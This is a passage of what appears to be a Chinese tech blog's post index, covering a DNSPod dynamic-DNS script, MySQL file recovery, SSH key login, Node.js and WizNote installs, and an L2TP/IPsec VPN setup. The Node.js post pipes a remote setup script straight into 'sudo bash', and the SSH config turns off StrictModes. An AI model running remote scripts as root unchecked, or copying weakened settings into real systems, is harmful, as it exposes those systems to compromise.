https://dnsapi.cn/Domain.List -d &quot;login_email=xxx&amp;login_password=xxx&quot;</code><br>获得record_id<br><code>curl -k https://dnsapi.cn/Record.List -d &quot;login_email=xxx&amp;login_password=xxx&amp;domain_id=xxx&quot;</code></p>\n<p>开机的时候自动运行这个脚本 ,在/etc/rc.local中加入一行<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># run pypod.py ddns</span></span><br><span class=\"line\">/usr/bin/python /home/pi/pypod.py</span><br></pre></td></tr></table></figure></p>\n<p>DNSPOD动态域名解析，ip获取有误修复<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\">#-*- coding:utf-8 -*-</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">import</span> httplib, urllib</span><br><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\"> </span><br><span class=\"line\">params = dict(</span><br><span class=\"line\">    login_email=<span class=\"string\">\"hisen@xx.com\"</span>, <span class=\"comment\"># replace with your email</span></span><br><span class=\"line\">    login_password=<span class=\"string\">\"pwd\"</span>, <span class=\"comment\"># replace with your password</span></span><br><span class=\"line\">    format=<span class=\"string\">\"json\"</span>,</span><br><span class=\"line\">    domain_id=xxxxxx, <span class=\"comment\"># replace with your domain_od, can get it by API Domain.List</span></span><br><span class=\"line\">    record_id=xxxxxx, <span class=\"comment\"># replace with your record_id, can get it by API Record.List</span></span><br><span class=\"line\">    sub_domain=<span class=\"string\">\"pi\"</span>, <span class=\"comment\"># replace with your sub_domain</span></span><br><span class=\"line\">    record_line=<span class=\"string\">\"默认\"</span>,</span><br><span class=\"line\">)</span><br><span class=\"line\">current_ip = <span class=\"keyword\">None</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">ddns</span><span class=\"params\">(ip)</span>:</span></span><br><span class=\"line\">    params.update(dict(value=ip))</span><br><span class=\"line\">    headers = &#123;<span class=\"string\">\"Content-type\"</span>: <span class=\"string\">\"application/x-www-form-urlencoded\"</span>, <span class=\"string\">\"Accept\"</span>: <span class=\"string\">\"text/json\"</span>&#125;</span><br><span class=\"line\">    conn = httplib.HTTPSConnection(<span class=\"string\">\"dnsapi.cn\"</span>)</span><br><span class=\"line\">    conn.request(<span class=\"string\">\"POST\"</span>, <span class=\"string\">\"/Record.Ddns\"</span>, urllib.urlencode(params), headers)</span><br><span class=\"line\"> </span><br><span class=\"line\">    response = conn.getresponse()</span><br><span class=\"line\">    <span class=\"keyword\">print</span> response.status, response.reason</span><br><span class=\"line\">    data = response.read()</span><br><span class=\"line\">    <span class=\"keyword\">print</span> data</span><br><span class=\"line\">    conn.close()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> response.status == <span class=\"number\">200</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getip</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    url=<span class=\"string\">'http://ip.taobao.com/service/getIpInfo.php?ip=myip'</span></span><br><span class=\"line\">    page=urllib.urlopen(url)</span><br><span class=\"line\">    data=page.read()</span><br><span class=\"line\">    jsondata=json.loads(data)</span><br><span class=\"line\">    ip = jsondata[<span class=\"string\">'data'</span>][<span class=\"string\">'ip'</span>]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ip</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"keyword\">True</span>:</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            ip = getip()</span><br><span class=\"line\">            <span class=\"keyword\">print</span> ip</span><br><span class=\"line\">            <span class=\"keyword\">if</span> current_ip != ip:</span><br><span class=\"line\">                <span class=\"keyword\">if</span> ddns(ip):</span><br><span class=\"line\">                    current_ip = ip</span><br><span class=\"line\">        <span class=\"keyword\">except</span> Exception, e:</span><br><span class=\"line\">            <span class=\"keyword\">print</span> e</span><br><span class=\"line\">            <span class=\"keyword\">pass</span></span><br><span class=\"line\">        time.sleep(<span class=\"number\">30</span>)</span><br></pre></td></tr></table></figure></p>\n"},{"title":"MYSQL数据文件恢复","url":"http://ohroot.com/2014/12/22/MYSQL数据文件恢复/","content":"<p>有那么三个mysql问的文件,后缀为.frm.MYD.MYI,表的引擎是MyISAM,故事就是发生在这样的背景下<br><a id=\"more\"></a></p>\n<h2 id=\"前言\">前言</h2><p>本来MyISAM引擎的数据库文件,直接把这三个文件拷贝到对应的数据库文件夹下,对于Linux就再改一下权限就可以了,但是今天遇到了问题,导进去没能成功查询数据.数据很关键,决定想办法解决下.</p>\n<p>首先介绍下这三个文件<br>.frm文件: 这是表结构描述方面的文件<br>.MYD文件: 这是表的数据文件<br>.MYI文件: 这是数据表关于索引的文件</p>\n<h2 id=\"解决办法\">解决办法</h2><p>首先把.frm文件拷贝到数据库目录下,然后建立两个空白文件,分别命名为<code>tablename.MYI</code>,<code>tablename.MYD</code>,把tablename换成对应的表名,然后再查看数据库就能看到数据表,只是表中内容是空的.<br>这时再把原来的MYI和MYD文件拷贝回来,替换掉两个空的MYI,MYD文件.</p>\n<p>下面再去看看数据库里面,表已经能正常执行增删改查了.</p>\n"},{"title":"linux配置证书登陆","url":"http://ohroot.com/2014/12/20/linux配置证书登陆/","content":"<a id=\"more\"></a>\n<h2 id=\"客户端建立私钥和公钥\">客户端建立私钥和公钥</h2><p>在客户端终端运行命令<code>ssh-keygen -t rsa</code><br>密码算法我们选择rsa，还有一种是dsa，证书登录常用的是rsa。<br>执行 ssh-keygen 时，才会在我的home目录底下的 .ssh/ 这个目录里面产生所需要的两把 Keys ，分别是私钥 (id_rsa) 与公钥 (id_rsa.pub)。为了安全我们最好对公钥设置上密码.</p>\n<h2 id=\"ssh服务端配置\">ssh服务端配置</h2><p>ssh服务器配置如下:</p>\n<p>vim /etc/ssh/sshd_config<br><figure class=\"highlight nginx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 禁用root账户登录，非必要，但为了安全性，请配置</span></span><br><span class=\"line\"><span class=\"title\">PermitRootLogin</span> <span class=\"built_in\">no</span></span><br><span class=\"line\"><span class=\"comment\"># 是否让 sshd 去检查用户家目录或相关档案的权限数据，这是为了担心使用者将某些重要档案的权限设错，可能会导致一些问题所致。例如使用者的 ~.ssh/ 权限设错时，某些特殊情况下会不许用户登入.</span></span><br><span class=\"line\">StrictModes <span class=\"built_in\">no</span></span><br><span class=\"line\"><span class=\"comment\"># 是否允许用户自行使用成对的密钥系统进行登入行为，仅针对 version 2。</span></span><br><span class=\"line\"><span class=\"comment\"># 至于自制的公钥数据就放置于用户家目录下的 .ssh/authorized_keys 内</span></span><br><span class=\"line\">RSAAuthentication <span class=\"built_in\">yes</span></span><br><span class=\"line\">PubkeyAuthentication <span class=\"built_in\">yes</span></span><br><span class=\"line\">AuthorizedKeysFile %h/.ssh/authorized_keys</span><br><span class=\"line\"><span class=\"comment\">#有了证书登录了，就禁用密码登录吧，安全要紧</span></span><br><span class=\"line\">PasswordAuthentication <span class=\"built_in\">no</span></span><br></pre></td></tr></table></figure></p>\n<p>配置好ssh服务器的配置了，那么我们就要把客户端的公钥上传到服务器端，然后把客户端的公钥添加到authorized_keys</p>\n<p>在客户端执行命令<br><code>scp ~/.ssh/id_rsa.pub root@&lt;ssh_server_ip&gt;:~</code><br>在服务端执行命令<br><code>cp  id_rsa.pub ～/.ssh/authorized_keys</code><br>如果有修改配置/etc/ssh/sshd_config，需要重启ssh服务器<br><code>service sshd restart</code></p>\n<h2 id=\"客户端通过私钥登录ssh服务器\">客户端通过私钥登录ssh服务器</h2><ul>\n<li>ssh命令<br><code>ssh -i ~/.ssh/id_rsa root@&lt;ssh_server_ip&gt;</code></li>\n<li>scp命令<br>`scp -i ~/.ssh/id_rsa filename root@<ssh_server_ip>:/filepath<br>每次敲命令，都要指定私钥，是一个很繁琐的事情，所以我们可以把私钥的路径加入ssh客户端的默认配置里<br>修改/etc/ssh/ssh_config<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#默认id_rsa就已经加入私钥的路径了</span></span><br><span class=\"line\">IdentityFile ~/.ssh/id_rsa</span><br><span class=\"line\"><span class=\"comment\">#如果有其他的私钥，还要再加入其他私钥的路径则在文件里面添加</span></span><br><span class=\"line\">IdentityFile ~/.ssh/other_rsa</span><br></pre></td></tr></table></figure>\n</ssh_server_ip></li>\n</ul>\n<h2 id=\"windows上使用\">windows上使用</h2><p>这里生成的公钥是OpenSSH格式,在window上可以通过小工具puttygen,点击窗口上的’Conversions’-&gt;’Import key’ 导入这个公钥,然后再导出成putty支持的证书格式即可使用putty登陆.<br>putty登陆指定证书方法:先正常填写IP,然后点击左侧的’Connection’-&gt;’SSH’-&gt;’Auth’,点击’Browse’导入公钥文件即可.<br>如果你是从windows的puttygen生成的公私钥,一样的需要导出成linux支持的OpenSSH格式.</p>\n"},{"title":"linux安装为知笔记","url":"http://ohroot.com/2014/12/20/linux安装为知笔记/","content":"<a id=\"more\"></a>\n<p>为知笔记无脑安装过程<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo add-apt-repository ppa:wiznote-team</span><br><span class=\"line\">sudo apt-get update</span><br><span class=\"line\">sudo apt-get install wiznote</span><br></pre></td></tr></table></figure></p>\n"},{"title":"ubuntu安装nodejs","url":"http://ohroot.com/2014/12/19/ubuntu安装nodejs/","content":"<p>ubuntu 安装nodejs 无脑操作…<br><a id=\"more\"></a><br>两条命令搞定</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl <span class=\"operator\">-s</span>L https://deb.nodesource.com/setup | sudo bash -</span><br><span class=\"line\">sudo apt-get install -y nodejs</span><br></pre></td></tr></table></figure>"},{"title":"CentOS搭建VPN","url":"http://ohroot.com/2014/12/17/CentOS搭建VPN/","content":"<p>搭建了一个L2TP+IPSec的VPN,对于小菜来说着实花了一番功夫…记录过程与此<br><a id=\"more\"></a></p>\n<h2 id=\"搭建L2TP+IPSec_VPN\">搭建L2TP+IPSec VPN</h2><p>搭建VPN的时候，仔细了解了下现在的三种VPN。分别是PPTP、IPSec/L2TP、OpenVPN，经过比较，我决定先尝试搭建一个IPSec/L2TP的VPN。<br>唉，网上资料好多，可是也好乱，自己搭建一边，做个整理吧</p>\n<h3 id=\"安装相应的软件\">安装相应的软件</h3><p>首先<code>yum update</code>更新下源.<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install wget <span class=\"built_in\">bind</span>-utils</span><br><span class=\"line\">wget http://mirror.nl.leaseweb.net/epel/<span class=\"number\">6</span>/i386/epel-release-<span class=\"number\">6</span>-<span class=\"number\">8</span>.noarch.rpm</span><br><span class=\"line\">rpm -ivh ./epel-release-<span class=\"number\">6</span>-<span class=\"number\">8</span>.noarch.rpm</span><br><span class=\"line\"></span><br><span class=\"line\">yum install openswan</span><br><span class=\"line\">yum install ppp xl2tpd</span><br><span class=\"line\">yum install lsof man</span><br></pre></td></tr></table></figure></p>\n<p>ppp是用于管理VPN用户的,我这里出现了问题,xl2tpd找不到源,解决办法是:到<a href=\"http://pkgs.org/\" target=\"_blank\" rel=\"external\">pkgs.org</a>这个网站去搜,我就找到了相应的最新版<a href=\"http://pkgs.org/centos-6/epel-i386/xl2tpd-1.3.6-1.el6.i686.rpm.html\" target=\"_blank\" rel=\"external\">地址</a><br>接下来就是找到相应的文件下载,然后安装<code>yum install xl2tpd-1.3.6-1.el6.i686.rpm</code></p>\n<h3 id=\"配置内核与防火墙\">配置内核与防火墙</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//设置 iptables 的数据包转发</span><br><span class=\"line\">iptables --table nat --append POSTROUTING --jump MASQUERADE</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"net.ipv4.ip_forward = 1\"</span> |  tee <span class=\"operator\">-a</span> /etc/sysctl.conf</span><br><span class=\"line\"></span><br><span class=\"line\">//是否接受ICMP转发,如果不是路由器，该值需要设置为 <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"net.ipv4.conf.all.accept_redirects = 0\"</span> |  tee <span class=\"operator\">-a</span> /etc/sysctl.conf</span><br><span class=\"line\">//是否发送ICMP转发(redirect)如果服务器不作为网关/路由器,该值建议设置为<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"net.ipv4.conf.all.send_redirects = 0\"</span> |  tee <span class=\"operator\">-a</span> /etc/sysctl.conf</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> vpn <span class=\"keyword\">in</span> /proc/sys/net/ipv4/conf/*; <span class=\"keyword\">do</span> <span class=\"built_in\">echo</span> <span class=\"number\">0</span> &gt; <span class=\"variable\">$vpn</span>/accept_redirects; <span class=\"built_in\">echo</span> <span class=\"number\">0</span> &gt; <span class=\"variable\">$vpn</span>/send_redirects; <span class=\"keyword\">done</span></span><br><span class=\"line\">sysctl -p</span><br></pre></td></tr></table></figure>\n<h3 id=\"其他配置\">其他配置</h3><ul>\n<li>编辑<code>/etc/rc.local</code>在结尾添加</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Correct ICMP Redirect issues with OpenSWAN</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> each <span class=\"keyword\">in</span> /proc/sys/net/ipv4/conf/*; <span class=\"keyword\">do</span></span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"number\">0</span> &gt; <span class=\"variable\">$each</span>/accept_redirects</span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"number\">0</span> &gt; <span class=\"variable\">$each</span>/send_redirects</span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"number\">0</span> &gt; <span class=\"variable\">$each</span>/rp_filter</span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>编辑 /etc/ipsec.conf ,我的配置如下:</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># /etc/ipsec.conf - Openswan IPsec configuration file</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># Manual:     ipsec.conf.5</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># Please place your own config files in /etc/ipsec.d/ ending in .conf</span></span><br><span class=\"line\"></span><br><span class=\"line\">version <span class=\"number\">2.0</span>     <span class=\"comment\"># conforms to second version of ipsec.conf specification</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># basic configuration</span></span><br><span class=\"line\">config setup</span><br><span class=\"line\">        interfaces=<span class=\"string\">\"%defaultroute\"</span></span><br><span class=\"line\">        <span class=\"comment\"># Debug-logging controls:  \"none\" for (almost) none, \"all\" for lots.</span></span><br><span class=\"line\">        klipsdebug=none</span><br><span class=\"line\">        plutodebug=<span class=\"string\">\"none\"</span></span><br><span class=\"line\">        plutostderrlog=/var/<span class=\"built_in\">log</span>/pluto.log</span><br><span class=\"line\">        <span class=\"comment\"># For Red Hat Enterprise Linux and Fedora, leave protostack=netkey</span></span><br><span class=\"line\">        protostack=netkey</span><br><span class=\"line\">        nat_traversal=yes</span><br><span class=\"line\">        oe=off</span><br><span class=\"line\">        <span class=\"comment\"># Enable this if you see \"failed to find any available worker\"</span></span><br><span class=\"line\">        nhelpers=<span class=\"number\">0</span></span><br><span class=\"line\">        virtual_private=%v4:<span class=\"number\">10.0</span>.<span class=\"number\">0.0</span>/<span class=\"number\">8</span>,%v4:<span class=\"number\">192.168</span>.<span class=\"number\">0.0</span>/<span class=\"number\">16</span>,%v4:<span class=\"number\">172.16</span>.<span class=\"number\">0.0</span>/<span class=\"number\">12</span></span><br><span class=\"line\"></span><br><span class=\"line\">conn L2TP-PSK</span><br><span class=\"line\">       authby=secret</span><br><span class=\"line\">       pfs=no</span><br><span class=\"line\">       auto=add</span><br><span class=\"line\">       keyingtries=<span class=\"number\">3</span></span><br><span class=\"line\">       rekey=no</span><br><span class=\"line\">       <span class=\"built_in\">type</span>=transport</span><br><span class=\"line\">       forceencaps=yes</span><br><span class=\"line\">       right=%any</span><br><span class=\"line\">       rightsubnet=vhost:%any,%priv</span><br><span class=\"line\">       rightprotoport=<span class=\"number\">17</span>/%any</span><br><span class=\"line\">       left=%defaultroute</span><br><span class=\"line\"></span><br><span class=\"line\">       leftprotoport=<span class=\"number\">17</span>/<span class=\"number\">1701</span></span><br><span class=\"line\">       <span class=\"comment\"># Apple iOS doesn't send delete notify so we need dead peer detection</span></span><br><span class=\"line\">       <span class=\"comment\"># to detect vanishing clients</span></span><br><span class=\"line\">       dpddelay=<span class=\"number\">10</span></span><br><span class=\"line\">       dpdtimeout=<span class=\"number\">90</span></span><br><span class=\"line\">       dpdaction=clear</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#You may put your configuration (.conf) file in the \"/etc/ipsec.d/\" and uncomment this.</span></span><br><span class=\"line\"><span class=\"comment\">#include /etc/ipsec.d/*.conf</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>编辑/etc/ipsec.secrets</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vi /etc/ipsec.secrets</span><br><span class=\"line\"><span class=\"comment\">#include /etc/ipsec.d/*.secrets</span></span><br><span class=\"line\">你的公网IP     %any:PSK     <span class=\"string\">\"任意的密钥\"</span></span><br></pre></td></tr></table></figure>\n<p>此时<code>ipsec verify</code>运行检查配置效果,我的如下:</p>\n<figure class=\"highlight livecodeserver\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Checking your <span class=\"keyword\">system</span> <span class=\"built_in\">to</span> see <span class=\"keyword\">if</span> IPsec got installed <span class=\"operator\">and</span> started correctly:</span><br><span class=\"line\">Version check <span class=\"operator\">and</span> ipsec <span class=\"command\"><span class=\"keyword\">on</span>-path                                 [<span class=\"title\">OK</span>]</span></span><br><span class=\"line\">Linux Openswan U2<span class=\"number\">.6</span><span class=\"number\">.32</span>/K2<span class=\"number\">.6</span><span class=\"number\">.32</span>-<span class=\"number\">504.3</span><span class=\"number\">.3</span>.el6.i686 (netkey)</span><br><span class=\"line\">Checking <span class=\"keyword\">for</span> IPsec support <span class=\"operator\">in</span> kernel                            [OK]</span><br><span class=\"line\"> SAref kernel support                                           [N/A]</span><br><span class=\"line\"> NETKEY:  Testing <span class=\"keyword\">for</span> disabled ICMP send_redirects              [OK]</span><br><span class=\"line\">NETKEY detected, testing <span class=\"keyword\">for</span> disabled ICMP accept_redirects     [OK]</span><br><span class=\"line\">Checking that pluto is running                                  [OK]</span><br><span class=\"line\"> Pluto listening <span class=\"keyword\">for</span> IKE <span class=\"command\"><span class=\"keyword\">on</span> <span class=\"title\">udp</span> <span class=\"title\">500</span>                             [<span class=\"title\">OK</span>]</span></span><br><span class=\"line\"> Pluto listening <span class=\"keyword\">for</span> NAT-T <span class=\"command\"><span class=\"keyword\">on</span> <span class=\"title\">udp</span> <span class=\"title\">4500</span>                          [<span class=\"title\">OK</span>]</span></span><br><span class=\"line\">Two <span class=\"operator\">or</span> more interfaces found, checking IP forwarding            [OK]</span><br><span class=\"line\">Checking NAT <span class=\"operator\">and</span> MASQUERADEing                                  [OK]</span><br><span class=\"line\">Checking <span class=\"keyword\">for</span> <span class=\"string\">'ip'</span> <span class=\"command\"><span class=\"keyword\">command</span>                                       [<span class=\"title\">OK</span>]</span></span><br><span class=\"line\">Checking /bin/sh is <span class=\"operator\">not</span> /bin/dash                               [OK]</span><br><span class=\"line\">Checking <span class=\"keyword\">for</span> <span class=\"string\">'iptables'</span> <span class=\"command\"><span class=\"keyword\">command</span>                                 [<span class=\"title\">OK</span>]</span></span><br><span class=\"line\">Opportunistic Encryption Support                                [DISABLED]</span><br></pre></td></tr></table></figure>\n<p>这里遇到问题则一定要先解决了.哪一项不过就google解决哪一项.</p>\n<ul>\n<li>编辑 /etc/xl2tpd/xl2tpd.conf</li>\n</ul>\n<p><code>vi /etc/xl2tpd/xl2tpd.conf</code><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">;</span><br><span class=\"line\">; This is a minimal sample xl2tpd configuration file <span class=\"keyword\">for</span> use</span><br><span class=\"line\">; with L2TP over IPsec.</span><br><span class=\"line\">;</span><br><span class=\"line\">; The idea is to provide an L2TP daemon to <span class=\"built_in\">which</span> remote Windows L2TP/IPsec</span><br><span class=\"line\">; clients connect. In this example, the internal (protected) network</span><br><span class=\"line\">; is <span class=\"number\">192.168</span>.<span class=\"number\">1.0</span>/<span class=\"number\">24</span>.  A special IP range within this network is reserved</span><br><span class=\"line\">; <span class=\"keyword\">for</span> the remote clients: <span class=\"number\">192.168</span>.<span class=\"number\">1.128</span>/<span class=\"number\">25</span></span><br><span class=\"line\">; (i.e. <span class=\"number\">192.168</span>.<span class=\"number\">1.128</span> ... <span class=\"number\">192.168</span>.<span class=\"number\">1.254</span>)</span><br><span class=\"line\">;</span><br><span class=\"line\">; The listen-addr parameter can be used <span class=\"keyword\">if</span> you want to <span class=\"built_in\">bind</span> the L2TP daemon</span><br><span class=\"line\">; to a specific IP address instead of to all interfaces. For instance,</span><br><span class=\"line\">; you could <span class=\"built_in\">bind</span> it to the interface of the internal LAN (e.g. <span class=\"number\">192.168</span>.<span class=\"number\">1.98</span></span><br><span class=\"line\">; <span class=\"keyword\">in</span> the example below). Yet another IP address (<span class=\"built_in\">local</span> ip, e.g. <span class=\"number\">192.168</span>.<span class=\"number\">1.99</span>)</span><br><span class=\"line\">; will be used by xl2tpd as its address on pppX interfaces.</span><br><span class=\"line\"></span><br><span class=\"line\">[global]</span><br><span class=\"line\">; listen-addr = <span class=\"number\">192.168</span>.<span class=\"number\">1.98</span></span><br><span class=\"line\">;</span><br><span class=\"line\">; requires openswan-<span class=\"number\">2.5</span>.<span class=\"number\">18</span> or higher - Also does not yet work <span class=\"keyword\">in</span> combination</span><br><span class=\"line\">; with kernel mode l2tp as present <span class=\"keyword\">in</span> linux <span class=\"number\">2.6</span>.<span class=\"number\">23</span>+</span><br><span class=\"line\">ipsec saref = no</span><br><span class=\"line\">; Use refinfo of <span class=\"number\">22</span> <span class=\"keyword\">if</span> using an SAref kernel patch based on openswan <span class=\"number\">2.6</span>.<span class=\"number\">35</span> or</span><br><span class=\"line\">;  when using any of the SAref kernel patches <span class=\"keyword\">for</span> kernels up to <span class=\"number\">2.6</span>.<span class=\"number\">35</span>.</span><br><span class=\"line\">; saref refinfo = <span class=\"number\">30</span></span><br><span class=\"line\">;</span><br><span class=\"line\">; force userspace = yes</span><br><span class=\"line\">;</span><br><span class=\"line\">; debug tunnel = yes</span><br><span class=\"line\"></span><br><span class=\"line\">[lns default]</span><br><span class=\"line\">ip range = <span class=\"number\">192.168</span>.<span class=\"number\">32.1</span>-<span class=\"number\">192.168</span>.<span class=\"number\">32.250</span></span><br><span class=\"line\"><span class=\"built_in\">local</span> ip = <span class=\"number\">192.168</span>.<span 